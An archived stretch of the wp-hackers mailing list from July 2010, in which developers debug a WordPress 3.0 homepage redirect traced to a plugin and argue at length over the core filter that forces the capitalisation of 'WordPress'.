>> plugins installed? ?Have you tried looking through the source of your
>> plugins to find mentions of the wp_redirection_items and
>> wp_redirection_modules tables (these are not core tables)?

>> My guess is that this is a problem with Urban Giraffe's Redirection
>> plugin http://urbangiraffe.com/plugins/redirection/ ?Do you have that
>> plugin installed? If you disable the plugin, does the problem go away
>> (always a good debugging step).

He stated in his original post that he deactivated all the plugins and
there was still an issue.

[snip]

>> If it is this plugin that's causing the problem, I suggest you move
>> your discussion to those support forums as the people there will be
>> able to help you better. ?If they can fix your problem, please also
>> post a note on your WordPress.org forums thread so that people
>> searching that site can get the answer they need.
>>
>> Please also direct future support inquiries to the proper channels.
>> _______________________________________________

In the future, don't jump to conclusions, it makes the rest of us look
like asses.

-- 
Thanks,
Elizabeth Buckwalter

From 24-7 at gmx.net  Tue Jul  6 23:07:26 2010
From: 24-7 at gmx.net (24/7)
Date: Tue, 6 Jul 2010 16:07:26 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C33ADE5.8050409@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<4C333EAD.8080508@thedextrousweb.com> <4C3365D1.3030104@mullenweg.com> 
	<201007061329.26694.chip@chipbennett.net>
	<AANLkTileYyT_FWnzaBkLBOAmeXL5HEcWiUwn_RWY6Y6R@mail.gmail.com> 
	<3e131826-79ac-478c-a235-0dfa254af480@d37g2000yqm.googlegroups.com> 
	<4C33ADE5.8050409@mullenweg.com>
Message-ID: <0d615d7b-ad85-4ab5-92bd-899d9865e3a7@c10g2000yqi.googlegroups.com>

On 7 Jul., 00:27, Matt Mullenweg <m... at mullenweg.com> wrote:
> On 7/6/2010 2:51 PM, 24/7 wrote:
>
> > Possible Q#1: How many downloads would such a plugin need?
>
> I'm not sure, more than 10,000 for sure and closer to 50k to be serious.

So far so good. That's what i meant with rules: How about a number
people can rely on?

>
> > Possible Q#2: When does an idea get's accepted as a possible
> > alternative?
>
> I'm not sure what this sentence means.

Sry. Written too short. We got the following ideas (if i didn't miss
one):
a) Out of core
b) A Plugin delivered with the WordPress download/update
c) An option in the (read?)-Settings
d) Add it to the spellchecker
e) stay as it is
f) ?

Because this list is completely missing someone who is moderating the
discussion (i mean for ex. summing up things, not dis-/allowing it to
appear on the list), i was asking for some rules, when such problem
solving suggestions get rated as an alternative to what's already
here. I strongly believe that everybody in here would be happy with
some basic rules for discussions about core elements, like for ex. we
got rules for themes that get added to the theme repository.

From mda at blogwaffe.com  Wed Jul  7 00:11:32 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Tue, 6 Jul 2010 17:11:32 -0700
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTim-FmU09UFqRkPSGx_H70JGbznJkQ7dn07Z3tcT@mail.gmail.com>
References: <AANLkTim-FmU09UFqRkPSGx_H70JGbznJkQ7dn07Z3tcT@mail.gmail.com>
Message-ID: <AANLkTilfY1MXOBEuOtCEfZGsZhr7BrxnR47gvZmaIk02@mail.gmail.com>

>> From: mccormicky <mccormicky at gmail.com>
>> It isn't WordPress and it is not a bug.
>> You're confusing your server.
>> URL: http://experience-tuscany.thriftytuscany.com/experience-tuscany
>>
>> If you make the slug different than experience-tuscany you won't get a 404
>
> So, what you're saying is that you can't have a page slug that is the
> same as a subdomain?

I don't believe this is the problem, though it's an excellent catch
definitely worth debugging.  It may be possible to contrive a scenario
in which this slug-is-the-same-as-subdomain would cause a problem, but
it is not generally a problem and would probably be highly server
dependent: likely not something core WordPress could detect and work
around.


>> On Tue, Jul 6, 2010 at 2:13 PM, Michael D Adams <mda at blogwaffe.com> wrote:
>>
>>> On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com> wrote:
>>> > I installed 3.0 and after creating a new page, additional to those I
>>> > already had prior to the upgrade to 3.0, my homepage redirects to that
>>> > newly created page with a 301 permanent redirect. If I delete the page
>>> > the redirect stays and produces a 404 error each time I try to visit
>>> > the homepage. To eliminate the error I have to go in the DB and delete
>>> > the 301 entry.
>>>
>>> This list is not a support list.
>
> You shouldn't jump to a conclusion such as this when WP 3.0 has just
> come out. ?It *could* be a bug.

A bad snip on my part.  It was meant to be a response to "Hi, I am
posting here as I can't get any help on the forums".  That is, "we
both recognize this is not the proper venue, but here's some help that
might get you started on the path to victory."

In retrospect, it probably would have been better to find the relevant
WordPress.org support forums thread and respond there.  I have since
tried to do so here: http://wordpress.org/support/topic/414774 ,
though I can't confirm it's from the same reporter.

But yes, it could be a bug in 3.0.  It could also be a bug in some
plugin exposed by 3.0 or catalyzed by the upgrade to 3.0, or a plugin
incompatible with 3.0.


>>> You have a problem with Redirects. ?Do you have any redirection
>>> plugins installed? ?Have you tried looking through the source of your
>>> plugins to find mentions of the wp_redirection_items and
>>> wp_redirection_modules tables (these are not core tables)?
>
>>> My guess is that this is a problem with Urban Giraffe's Redirection
>>> plugin http://urbangiraffe.com/plugins/redirection/ ?Do you have that
>>> plugin installed? If you disable the plugin, does the problem go away
>>> (always a good debugging step).
>
> He stated in his original post that he deactivated all the plugins and
> there was still an issue.

OP stated he believed the problem to be related to some database
tables that are not present in core but are present in the above
plugin.  OP also stated that deleting something from the DB
(presumably from those non-core tables) fixes the problem, which
points away from core code (under that presumption).

It's possible that that plugin stores pieces of its redirects in a way
that aren't properly removed even after deactivating the plugin (in
.htaccess, for example, though that specific example was already
eliminated as a possible source of the problem).  If the answer had
been "Yes I have that plugin, and yes I can confirm that deactivating
it doesn't help", that would be valuable information.

In the end, the problem may not be related to those tables at all, but
by going through these questions, people can start to figure that out.


>>> If it is this plugin that's causing the problem, I suggest you move
>>> your discussion to those support forums as the people there will be
>>> able to help you better. ?If they can fix your problem, please also
>>> post a note on your WordPress.org forums thread so that people
>>> searching that site can get the answer they need.
>>>
>>> Please also direct future support inquiries to the proper channels.
>>> _______________________________________________
>
> In the future, don't jump to conclusions, it makes the rest of us look
> like asses.

I attempted to help someone debug their site, pointed him to a
resource that might better serve them, and asked him to help others
out by reporting the eventual fix to the resource at which he
originally looked for a solution.

I apologize if my email, tone, or anyone's perception of them made
anyone look... in any way bad.

Mike
--mdawaffe

From andre at pixelplexus.co.za  Wed Jul  7 06:43:47 2010
From: andre at pixelplexus.co.za (andre at pixelplexus.co.za)
Date: Tue, 6 Jul 2010 23:43:47 -0700
Subject: [wp-hackers] 'cognitive load' Re:  Putting the P in WordPress
In-Reply-To: <4C33B31B.3040009@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<AANLkTikieGPSjp0OdED0K6v2b5I1ynqGMhD4teng8nG6@mail.gmail.com>
	<AANLkTind_Lj1956JS2mD3ua2Y-zcczoItX6LrhhJ5Z9M@mail.gmail.com>
	<4C33AE66.3080409@mullenweg.com>
	<AANLkTilAgVsWhO5BmA_3Ih-IZitkGXhgB-O3rHMK7-iU@mail.gmail.com>
	<4C33B31B.3040009@mullenweg.com>
Message-ID: <561f8092f48525e578d5f3a68d1c1e87.squirrel@webmail.pixelplexus.co.za>

Aside, as a user I'm starting to feel just a little bit uncomfortable with
what's being implied about my capacity for 'cognitive load' ;-)

Suppose in the end its about finding a good balance between avoiding the
evils of design for the lowest-common-denominator on the one side, and the
holy grail of 'it just works' on the other.

> On 7/6/2010 6:37 PM, Mitch Canter wrote:
>> Just out of curiosity, what value would having a plugin to opt out (in
>> either case) vs. an option in the menu give.  I would think that the
>> server load the option generation would cause would be negligible, yet
>> the latter being more user-friendly to someone not schooled in the art
>> of / having no access to plugins.
>
> The core philosophy of WordPress is fairly anti-option. In Open Source
> software, in particular, arguments can get so heated and personal that
> in an effort to put out the fire many projects solve disagreements with
> options.
>
> While this may stop the argument, it does so at the expense of the user.
> (And ultimately the software.) It puts a cognitive load on the user to
> make a decision about something every time they visit or update that
> screen, the more esoteric or trivial the option, the more likely it is
> to confuse and confound everyone who comes across it.
>
> For a nightmare-inducing example of what happens when project leadership
> does not guard against this, study this screen from OpenOffice.org and
> realize there are 42 others just like it or worse in user-visible
> options panel:
>
> http://matt.files.wordpress.com/2010/07/open-office.png
>
> (42? Can't be a coincidence. :))
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



From Gavin.Pearce at 3seven9.com  Wed Jul  7 08:20:03 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Wed, 7 Jul 2010 09:20:03 +0100
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTikCQGsRV-bltw6tuolLq6pREtZogCErERXXYFtv@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com><AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com>
	<AANLkTikCQGsRV-bltw6tuolLq6pREtZogCErERXXYFtv@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FD0@tbs-sbs01.TBS.local>

Hi,

Please ignore the below information from mccormicky - it's incorrect.

mccormicky - I appriciate your support in here, but if you're going to
make arrogant remarks about a core-topic then please at least offer
correct advice.

I can understand slight errors, everyone makes them - but this is the
second time in as many days that you've offered completely incorrect
information, that doesn't even have *any* backing or grounds.

That said, thanks for trying, but it's worth saying you're not sure when
you're not sure.   : )

Best wishes,
Gavin


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of mccormicky
Sent: 06 July 2010 20:24
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Home redirects to new page on WP 3.0

Oh whatever. They can talk about P for 4 days but someone can't help
someone
else.
It isn't WordPress and it is not a bug.
You're confusing your server.

Page Title: Experience Tuscany
Page Slug:  experience-tuscany
Domain: thriftytuscany.com
Sub-Domain: experience-tuscany
URL: http://experience-tuscany.thriftytuscany.com/experience-tuscany

If you make the slug different than experience-tuscany you won't get a
404








On Tue, Jul 6, 2010 at 2:13 PM, Michael D Adams <mda at blogwaffe.com>
wrote:

> On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com> wrote:
> > I installed 3.0 and after creating a new page, additional to those I
> > already had prior to the upgrade to 3.0, my homepage redirects to
that
> > newly created page with a 301 permanent redirect. If I delete the
page
> > the redirect stays and produces a 404 error each time I try to visit
> > the homepage. To eliminate the error I have to go in the DB and
delete
> > the 301 entry.
>
> This list is not a support list.
>
> You have a problem with Redirects.  Do you have any redirection
> plugins installed?  Have you tried looking through the source of your
> plugins to find mentions of the wp_redirection_items and
> wp_redirection_modules tables (these are not core tables)?
>
> My guess is that this is a problem with Urban Giraffe's Redirection
> plugin http://urbangiraffe.com/plugins/redirection/  Do you have that
> plugin installed? If you disable the plugin, does the problem go away
> (always a good debugging step).
>
> Here's a link which addresses what sounds like your problem.
>
>
>
http://urbangiraffe.com/support/topic/home-page-is-redirecting-to-anothe
r-wp-page-without-my-instruction-to-do-so
>
> If it is this plugin that's causing the problem, I suggest you move
> your discussion to those support forums as the people there will be
> able to help you better.  If they can fix your problem, please also
> post a note on your WordPress.org forums thread so that people
> searching that site can get the answer they need.
>
> Please also direct future support inquiries to the proper channels.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From Gavin.Pearce at 3seven9.com  Wed Jul  7 08:48:46 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Wed, 7 Jul 2010 09:48:46 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C33AAC0.1080702@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com><201007061329.26694.chip@chipbennett.net>
	<4C33AAC0.1080702@mullenweg.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FD3@tbs-sbs01.TBS.local>

Matt,

Sorry but I think you're missing the issue, even after reading every
email.

In fact, no one has yet been able to answer my question - so here it is
again with stars ;)

*******
*** What do we really actually gain from this function? Seriously?
*******

Is the function worth breaking sites of users, and finally taking the
step towards modifying user output?

Code bloat, slight performance degradtion, and modifiying user output
for no compelling reason (please do provide a compelling reason why this
extra filter is needed) seem to be the issues here.

Why stop at Wordpress, why not start forcing all the spelling mistakes
through?

Oh Matt btw - you're "plugin" scenario makes no sense, as Chip pointed
out, your Wordpress to WordPress already has a plugin, has done for
ages. 

*334 downloads*

That suggests quite strongly to me that the community do *not* need this
function - wouldn't you agree?

You can't let the fact that many users have downloaded without
complaining - a large majority of all users will never know the function
exists as they will never write Wordpress in a blog post - that's why
the ones who do are kicking up a fuss - I'm sure if other users knew
also they could also be compelled to join the discussion.

Would like to see someone detail the reasons FOR this function/filter.

Gav



-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Matt
Mullenweg
Sent: 06 July 2010 23:14
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

On 7/6/2010 2:29 PM, Chip Bennett wrote:
> How about moving the entire function itself into a plugin, and see how
many
> downloads*it*  gets?

Because it doesn't do any harm, and is the sort of thing that's best 
when it's invisible. (Like all of the other features I referred to.)

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From chip at chipbennett.net  Wed Jul  7 12:25:40 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Wed, 7 Jul 2010 07:25:40 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C33AAC0.1080702@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<4C33AAC0.1080702@mullenweg.com>
Message-ID: <201007070725.40934.chip@chipbennett.net>

On Tuesday 06 July 2010 5:14:24 pm Matt Mullenweg wrote:
> On 7/6/2010 2:29 PM, Chip Bennett wrote:
> > How about moving the entire function itself into a plugin, and see how
> > many downloads*it*  gets?
> 
> Because it doesn't do any harm, and is the sort of thing that's best
> when it's invisible. (Like all of the other features I referred to.)

I believe the statement "it doesn't do any harm" is demonstrably false on two 
counts:

1) As has already been documented, the function in its current form breaks 
things for many use cases

2) Modifying (especially, in an editorial manner) end user content without 
knowledge or consent is inherently harmful.

On Tuesday 06 July 2010 5:26:23 pm Matt Mullenweg wrote:
> On 7/6/2010 2:42 PM, Chip Bennett wrote:
> > I believe that the issue here involves equally the underlying impropriety
> > of the filter and your perceived attitude toward those who are asking
> > for the filter's removal.
> 
> I'm sorry if my words did not convey my understanding and empathy for
> people who are against the filter -- email is not great at that -- but I
> having read every message in this thread I think I have a pretty good
> grasp of it.

I do believe you have a good grasp of the issue. You're a pretty sharp guy. ;)

And any written medium is sub-optimal for conveying the full range of emotion 
and intent underlying one's communication. Perhaps the issue is that, for 
those who have not communicated with you in person, it is incredibly difficult 
to differentiate between arrogance/dismissiveness/snideness, and humor (or 
other non-offensive attitudes)?

> 
> > By imposing on end users your purpose - regardless of how noble - of
> > correctly spelling "WordPress" you are violating the very freedoms you
> > espouse.
> 
> That statement is hard for me to accept because the freedoms provided by
> the GPL are completely intact and, to me, sacred. I have spent the
> majority of my adult life spreading them to millions of people and I
> feel to compare this trivial issue to removing them should invoke some
> form of Godwin's law, and I will not respond to any more messages along
> that thread.

Nobody has invoked Godwin's law - in any form - other than you. Pre-emptively 
invoking it is just as much a logical flaw, wouldn't you say?

But I think my point is valid here, too. You as the developer are imposing 
your purpose on end users, without knowledge or consent, and without providing 
any benefit to the end user. 

Emoticons provide a benefit to end users (for those who choose to use them) 
and an option to disable. autop provides a benefit to end users (for those who 
choose to use it) and an alternative (HTML editor) for those who choose not to 
use it. Etc., etc., etc. - for any other analogous function you might choose 
to bring up in an attempt to defend this capital_P_dangit filter.

> 
> > This function should have been written as a plugin from the very
> > beginning. Bundle it with core if you must (surely it is - at a minimum
> > - more useful than Hello Dolly, after all).
> 
> I think you also fundamentally misunderstand the point of Hello Dolly.

I understand that Hello Dolly is intended to be a learning tool for would-be 
plugin developer. (In fact, I used it for that purpose.)  If there exists any 
further intent for Hello Dolly, I am unaware. And if its only (or primary) 
intent is as a plugin-development learning tool, I stand by my assertion that 
it has no business being in the default download package, since it is useless 
to 99% of users.

> 
> > As for me: what concerns me most is the "slippery slope" consideration of
> > the core development team's response to community outcry regarding this
> > function being added to core.
> 
> One of the hardest things about developing software for an audience as
> large as WordPress' is maintaining a balance between community feedback
> (where community > 1% of users) and developer feedback (this list, the
> ~1,200 active people on Trac).

What I (and, apparently, others) cannot understand, though, is why you seem to 
be so easily dismissing the expressed opinion of so much of that community. 
Developers and end users alike are near-universally opposed to this filter 
being included in core - as expressed here, in Trac, in the wordpress.org 
support forums, and elsewhere (blog posts, WP Tavern (and its forums), etc.

Where is the support for this filter being in core, outside of your own 
opinion and that of a handful of core developers?

On Tuesday 06 July 2010 5:27:49 pm Matt Mullenweg wrote:
> On 7/6/2010 2:51 PM, 24/7 wrote:
> > Possible Q#1: How many downloads would such a plugin need?
> 
> I'm not sure, more than 10,000 for sure and closer to 50k to be serious.

So, a plugin to *remove* the filter needs 50,000 downloads to be seriously 
considered as a valid expression of intent of the WordPress community - but a 
plugin to *add* the filter that has less than 1% of that number gets rolled 
into core?

How does that make sense?

From wp-hackers at striderweb.com  Wed Jul  7 13:11:44 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 7 Jul 2010 08:11:44 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
Message-ID: <609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>

Eric's write up was excellent.

On Jul 6, 2010, at 3:12 PM, eric at eamann.com wrote:

> Unfortunately, this is where the conversation begins to derail.  Let's try not
> to make it a personal issue.

I laughed when Matt said we were approaching Godwin's Law. :-)  Some of the rhetoric is getting a bit overwrought, but for the most part I think it's remained pretty civil.

> We're facing three core problems here (that I've
> seen at least):
>  
> 1) WordPress has added a feature that modifies post content without input or
> oversight from end users, many of whom are not technically skilled enough to
> program or install a work-around.  This is a question of perceived censorship
> because the platform is now actively changing the words you originally wrote
> without your permission. (Philosophically I see this as a large issue.)

This is a big issue.  The thing for Matt et al to remember is that in this case the *perception* among the community is as important as the issue itself.  The Core committers are skirting the idea that in the end, what the community wants doesn't matter.  Significantly, this is not the first time that personal preferences have simply overridden strong opposition.

1) A lot of people want to get rid of Hello Dolly (personally a non issue to me).  There was a lot of discussion on this one, but ultimately it was Matt's baby and so it stays.  Mat said in one of his replies that so-and-so clearly didn't understand the intent of Hello Dolly.  He's right -- I think most people don't.  Again, not a big deal to me, but maybe that should be made more clear?

2) The obfuscated code for the "blue pill" easter egg.  Even after someone pointed out that with this code in there, ***WordPress is no longer GPL2 Compliant***, it still ended with "Matt likes it there, so it stays."  What the heck?  We can't even un-obfuscate the code?  Really???

Keep reading before throwing out all the "That isn't how it was" arguments...

> [...]The most resounding issue, though, is the lack of openness in discussions here
> on the mailing list.  It doesn't matter who you are or how you're affiliated
> with the WordPress project, you can have an opinion.  Further more, that opinion
> can be wrong.  That's what makes working on a project like this productive - you
> voice your opinion, discuss it with the community, and come to a conclusion
> about the best way forward.  Your initial idea may or may not be the final
> conclusion.  
>  
> To forego this discussion before committing code, though, threatens to destroy
> the process.  Community members who thought themselves your equal now feel left
> at the side of the road.  Dismissing concerns out-of-hand only reinforces this
> feeling and causes a minor issue (the entire patch was ~5 lines of code!) to
> escalate to an emotional, major one (we've been debating this for how long?). 

Yes, Yes, and Yes.

Matt et al, what you're missing is the point of perception.  This has become a matter of principle for a lot of people who contribute to WordPress.  Yes, this is a community project, and yes, communities need leaders.  But when those leaders abuse that authority, you really start causing trouble within that community.  Adding in little chunks of code that please you on a personal level is an abuse of that authority.  You Can !== You Should.

Here's the question that nobody supporting this patch has answered, though it has been asked many times:  Does this patch serve the User, or does it serve the Software?  Hint:  it does cause problems -- with web sites and as a matter if principle --  and other patches have been rejected on a basis of **far less* opposition than this one.  Any other patch would have been reverted by now, but somebody somewhere *wants* it there

As I've said before, this could be done in a way that serves the User.  The best suggestion I've seen is that this simply should be a "spell check" thing -- indicate to the author that there's a misspelling, **but don't force the change**.

> [,,,]I'd like to suggest that we take a minute to cool down and think about what's
> really at issue here.  Are we upset about a patch?  Are we upset about an
> inconsistent commit process?  Are we upset about the dichotomy between core and
> non-core developers?  Then, without insulting one another, injecting snide
> remarks, or claiming that people can "vote with their feet" and leave a project
> they love because of a ~5-line patch, let's figure out what we can learn through
> this process and how we can avoid such a massive public backlash in the future.

I've tried to avoid making this personal, because it really shouldn't be, but...

Yes, Matt, saying "You can just leave" is just wrong.  It's arrogant and dismissive.  It's "Too bad, I'm gonna do what I want" with different wording, and had no place in this discussion.  I doubt that's at all what you intended, but that is the clear implication of that kind of statement.  Nobody is going to abandon WordPress over this, but that doesn't mean the change was okay.

> For what it's worth, I'd like to see:
> - This filter turned off (I'd rather write a plug-in to *add* a filter than
> *remove* one)
> - A clear, concise list of what steps *everyone* must follow when submitting a
> patch to core

A big Yes on the second one.  Unless there is some huge bug that needs to be fixed ASAP, nobody should just be sticking code into Core without discussion.

> I don't know about everyone else, but I'd be more than happy with either or both
> of those ... 

Both for me, but ultimately I guess I'd be happy if it simply didn't keep happening.

Getting personal again for a moment:  Matt -- I respect the hell out of all you've done for this project and for Open Source in general.  That is quite frankly why "Hello Dolly" doesn't bother me, even if it is mainly "Matt's Baby".  Fine -- the Guy In Charge just wants it, and it doesn't harm anything.  Let him have it.</personal>

Regarding the obfuscated easter egg code:  In discussion of the "Wordpress" filter, the main defense is that a one-line plugin can turn it off.  Great.  But that flies in the face of the fact that we have retained obfuscated code in Core despite opposition to such, where the obfuscation is there solely for the purpose of making it difficult to figure out what the heck is going on.  When someone pointed out that obfuscated code is not allowed under the GPL, that should have been the end of the discussion right there -- get rid of it.  Instead, somehow, all that discussion had absolutely no effect, because Somebody, Somewhere, wants that code in there.  And that is what makes me think that "you can turn the filter off with a plugin" misses the point.  These two things are part and parcel of the same argument.

-- 
Stephen Rider
http://striderweb.com/


From mccormicky at gmail.com  Wed Jul  7 13:25:05 2010
From: mccormicky at gmail.com (mccormicky)
Date: Wed, 7 Jul 2010 09:25:05 -0400
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FD0@tbs-sbs01.TBS.local>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com>
	<AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com>
	<AANLkTikCQGsRV-bltw6tuolLq6pREtZogCErERXXYFtv@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FD0@tbs-sbs01.TBS.local>
Message-ID: <AANLkTinLZ5Fm3gkWX33jSpC0aKOjZ2uPp5goCOltGINC@mail.gmail.com>

OP mailapera and I emailed off list (after he was told to go away) and it
turned out it was an issue with a plugin, the 404 was not caused by
upgrading to WordPress 3.0  and any "bugs" were with the redirection plugin
not being de activated while he was trying to troubleshoot the problem.


On Wed, Jul 7, 2010 at 4:20 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> Hi,
>
> Please ignore the below information from mccormicky - it's incorrect.
>
> mccormicky - I appriciate your support in here, but if you're going to
> make arrogant remarks about a core-topic then please at least offer
> correct advice.
>
> I can understand slight errors, everyone makes them - but this is the
> second time in as many days that you've offered completely incorrect
> information, that doesn't even have *any* backing or grounds.
>
> That said, thanks for trying, but it's worth saying you're not sure when
> you're not sure.   : )
>
> Best wishes,
> Gavin
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of mccormicky
> Sent: 06 July 2010 20:24
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Home redirects to new page on WP 3.0
>
> Oh whatever. They can talk about P for 4 days but someone can't help
> someone
> else.
> It isn't WordPress and it is not a bug.
> You're confusing your server.
>
> Page Title: Experience Tuscany
> Page Slug:  experience-tuscany
> Domain: thriftytuscany.com
> Sub-Domain: experience-tuscany
> URL: http://experience-tuscany.thriftytuscany.com/experience-tuscany
>
> If you make the slug different than experience-tuscany you won't get a
> 404
>
>
>
>
>
>
>
>
> On Tue, Jul 6, 2010 at 2:13 PM, Michael D Adams <mda at blogwaffe.com>
> wrote:
>
> > On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com> wrote:
> > > I installed 3.0 and after creating a new page, additional to those I
> > > already had prior to the upgrade to 3.0, my homepage redirects to
> that
> > > newly created page with a 301 permanent redirect. If I delete the
> page
> > > the redirect stays and produces a 404 error each time I try to visit
> > > the homepage. To eliminate the error I have to go in the DB and
> delete
> > > the 301 entry.
> >
> > This list is not a support list.
> >
> > You have a problem with Redirects.  Do you have any redirection
> > plugins installed?  Have you tried looking through the source of your
> > plugins to find mentions of the wp_redirection_items and
> > wp_redirection_modules tables (these are not core tables)?
> >
> > My guess is that this is a problem with Urban Giraffe's Redirection
> > plugin http://urbangiraffe.com/plugins/redirection/  Do you have that
> > plugin installed? If you disable the plugin, does the problem go away
> > (always a good debugging step).
> >
> > Here's a link which addresses what sounds like your problem.
> >
> >
> >
> http://urbangiraffe.com/support/topic/home-page-is-redirecting-to-anothe
> r-wp-page-without-my-instruction-to-do-so<http://urbangiraffe.com/support/topic/home-page-is-redirecting-to-anothe%0Ar-wp-page-without-my-instruction-to-do-so>
> >
> > If it is this plugin that's causing the problem, I suggest you move
> > your discussion to those support forums as the people there will be
> > able to help you better.  If they can fix your problem, please also
> > post a note on your WordPress.org forums thread so that people
> > searching that site can get the answer they need.
> >
> > Please also direct future support inquiries to the proper channels.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From m at mullenweg.com  Wed Jul  7 14:12:55 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed, 07 Jul 2010 10:12:55 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FD3@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com><201007061329.26694.chip@chipbennett.net>	<4C33AAC0.1080702@mullenweg.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FD3@tbs-sbs01.TBS.local>
Message-ID: <4C348B67.2060705@mullenweg.com>

On 7/7/2010 4:48 AM, Gavin Pearce wrote:
> *******
> *** What do we really actually gain from this function? Seriously?
> *******

The correct capitalization of WordPress all over the web. A small easter 
egg that makes the people who care about such things happy. (It also 
increases participation on Trac.)

> Is the function worth breaking sites of users, and finally taking the
> step towards modifying user output?

If it breaks sites, that's a bug that can be fixed. (And already has.)

> Why stop at WordPress, why not start forcing all the spelling mistakes
> through?

It's not technically a spelling mistake, like "degradtion" and 
"modifiying" are. It is impossible to change the meaning of someone's 
sentence by capitalizing the P in WordPress, except in an extreme 
meta-case where the change itself is being discussed, in which case it 
is easy to avoid the filter, or for someone aware of the filter to 
deactivate it.

> Oh Matt btw - you're "plugin" scenario makes no sense, as Chip pointed
> out, your Wordpress to WordPress already has a plugin, has done for
> ages.

I don't see how that is pertinent to this discussion. It's much easier 
to test a negation than a positive. I think both sides agree that the 
average person is not going to notice or care about this change, so 
probably not go to the explicit action of installing a plugin for it. 
However given the faster-than-ever adoption of 3.0, if strongly objected 
to it you would imagine a plugin deactivating the already-active 
functionality would gain popularity.

Does that make sense?

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From Gavin.Pearce at 3seven9.com  Wed Jul  7 14:41:45 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Wed, 7 Jul 2010 15:41:45 +0100
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTinLZ5Fm3gkWX33jSpC0aKOjZ2uPp5goCOltGINC@mail.gmail.com>
